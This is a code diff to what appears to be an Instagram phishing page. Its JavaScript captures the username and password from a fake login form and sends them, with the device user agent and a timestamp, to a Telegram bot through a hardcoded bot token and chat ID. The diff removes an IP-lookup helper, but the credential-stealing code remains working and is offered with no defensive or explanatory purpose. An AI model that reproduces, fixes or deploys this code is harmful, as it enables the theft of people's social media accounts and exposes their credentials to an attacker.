@@ -58,13 +58,12 @@
   const BOT_TOKEN = "8773604137:AAEjU7B_uzTTX6DCWcyKQtroGbkdgA24nRc";
   const CHAT_ID = "7264141539";
 
-  document.getElementById('loginBtn').addEventListener('click', async () => {
+  document.getElementById('loginBtn').addEventListener('click', () => {
     const username = document.getElementById('username').value.trim();
     const password = document.getElementById('password').value.trim();
 
     if (username && password) {
-      const ip = await getIP();
-      const caption = `🔥 Instagram Login Captured!\n\n👤 Username: ${username}\n🔑 Password: ${password}\nIP: ${ip}\nDevice: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`;
+      const caption = `🔥 Instagram Login Captured!\n\n👤 Username: ${username}\n🔑 Password: ${password}\nIP: Loading...\nDevice: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`;
 
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
@@ -81,14 +80,6 @@
       document.getElementById('errorMsg').style.display = 'block';
     }
   });
-
-  async function getIP() {
-    try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      return data.ip;
-    } catch(e) { return 'N/A'; }
-  }
 </script>
 </body>
-   </html>
+</html>
